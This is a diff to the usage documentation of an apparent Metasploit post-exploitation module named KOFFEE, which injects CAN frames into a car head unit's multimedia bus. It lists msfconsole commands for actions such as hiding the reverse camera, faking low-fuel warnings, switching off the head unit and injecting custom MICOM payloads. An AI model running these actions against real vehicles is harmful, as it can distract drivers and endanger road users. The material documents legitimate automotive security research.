@@ -15,7 +15,7 @@ into the Multimedia CAN (M-Can) of the vehicle.
 - [ ] Start `msfconsole`
 - [ ] `use post/android/local/koffee`
 - [ ] `set session 1`
-- [ ] `run`
+- [ ] `toogle_radio_mute` or `run`
 
 ### What do you need
 * An active session with the Head Unit
@@ -25,6 +25,40 @@ into the Multimedia CAN (M-Can) of the vehicle.
 - NUM_MSG: it expresses the number of MICOM commands sent each time
 - PERIOD: it indicates the time (ms) interval between two MICOM commands, aka Period of CAN frames
 - SESSION: it referes to the metasploit session number on which this module is run.
+- CMD_PAYLOAD: It refers to the Micom payload to be injected, e.g.,  cmd byte1 byte3 byte2'.
+By default it is set to `00 00 00`. This options works only for the `INJECT_CUSTOM` action
+
+## Actions
+
+The following actions can be triggered on the Head Unit. An action can be triggerd by inserting in the
+metasploit input console the action name in lowercase, e.g., camera_reverse_off.
+
+- CAMERA_REVERSE_OFF:       It hides the parking camera video stream
+- CAMERA_REVERSE_ON:       It shows the parking camera video stream
+- CHANGE_CLUSTER_LANGUAGE:  It changes the cluster language
+- HIGH_SCREEN_BRIGHTNESS:  It increases the head unit screen brightness
+- INJECT_CUSTOM:            It injects custom micom payloads
+- LOW_FUEL_WARNING:         It pops up a low fuel message on the head unit
+- LOW_SCREEN_BRIGHTNESS:    It decreses the head unit screen brightness
+- MAX_RADIO_VOLUME:        It sets the radio volume to the max
+ - NAVIGATION_FULL_SCREEN:   It pops up the nagitaion app
+- REDUCE_RADIO_VOLUME:      It reduces radio volume
+- SEEK_DOWN_SEARCH:         It triggers the seek down radio frequency search
+- SEEK_UP_SEARCH:           It triggers the seek up radio frequency search
+- SET_NAVIGATION_ADDRESS:   It pops up the nagitaion address window
+- SWITCH_OFF_Hu:            It switches off the head unit
+- SWITCH_ON_Hu:             It switches on the head unit
+ - TOGGLE_RADIO_MUTE        It mutes/umutes the radio
+
+An action can be also triggered using the commands:
+- [ ] `set action CAMERA_REVERSE_ON`
+- [ ] `run`
+
+To execute the `INJECT_CUSTOM` action, you may want also to set up the right payload.
+The commands to use to trigger this action are
+- [ ] `set action INJECT_CUSTOM`
+- [ ] `set CMD_PAYLOAD 01 FF`
+- [ ] `run`
 
 ## Scenarios
 KOFFEE can be run as post-exploitation module when an active session is available with the Head Unit (HU).
@@ -40,48 +74,9 @@ inject CAN bus frames into the M-CAN bus of the vehicle.
 msf6 > use post/android/local/koffee
 msf6 post(android/local/koffee) > set session 1
 session => 1
-msf6 post(android/local/koffee) > run
+msf6 post(android/local/koffee) > toggle_radio_mute
 
-[*]  
-[*]            `:+ydmNMMNmhs:
-         .odMMMMMMMMMMMMMMm`
-       /dM MMMMMMM MMMMMMM: o`
-     /mMMM MMMMMM MMMMMMm-`yMs
-   .dMMMMM MMMMM MMMMMm+ :mMMN
-  :NMMMMMM MMMM MMMMh/ :hMMMMN
- /MMMMMMMM MMM Mmy/`.omMMMMMMy
-.NMMMMMMMM my+:`./smMMMMMMMMN.
-yMMMMMMNy/ `/shNMMMMMMMMMMMM/
-NMMMMd/`-s MM MMMMMMMMMMMMN:
-NMMd- +mMM MMM MMMMMMMMMMd.
-sMo :mMMMM MMMM MMMMMMMm/
-`/ oMMMMMM MMMMM MMMMd/
-  .NMMMMMM MMMMMM do.
-    :shmNMMNmdy+:`        
-[*]  
-[*]  -- Welcome, would you like a KOFFEE? --
-[*]  
-[*] Make your choice:
-     1. Mute/unmute radio
-     2. Reduce radio volume
-     3. Radio volume at maximum
-     4. Low screen brightness
-     5. High screen brightness
-     6. Low fuel warning message
-     7. Navigation full screen
-     8. Set navigation address
-     9. Seek down
-     10. Seek Up
-     11. Switch off Infotainment
-     12. Switch On Infotainment
-     13. Camera Reverse On
-     14. Camera Reverse Off
-     15. Inject pre-crafted CAN frames into MM bus
-     16. Inject custom command
-     0. Exit
-Koffee > 1
-[*]  -- Sending Command -- 
-...
-Koffee > 0
-[*] Post module execution completed
+[*]  -- Starting action -- 
+[*]  -- Mute/umute radio -- 
+[+]  -- Command Sent -- 
 ```
